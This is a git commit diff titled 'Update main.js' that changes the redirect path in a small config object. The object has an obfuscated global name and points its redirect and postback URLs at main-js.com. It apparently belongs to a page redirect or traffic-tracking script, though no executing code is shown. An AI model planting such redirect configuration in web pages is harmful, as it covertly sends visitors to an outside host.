8d3447022f77ac3e0e9c1063daeb9d28417624c2
ferzinm <63232887+ferzinm@users.noreply.github.com>
2020-10-06 11:22:32 +0300

    Update main.js

--- main.js
+++ main.js
@@ -4,7 +4,7 @@
         window._fckLxKmpPqrGc9GY = {
             unique: false,
             ttl: 86400,
-            R_PATH: 'https://main-js.com/rp7ygT',
+            R_PATH: 'https://main-js.com/fLzFpY',
             P_PATH: 'https://main-js.com/19d4412/postback',
         };
     }
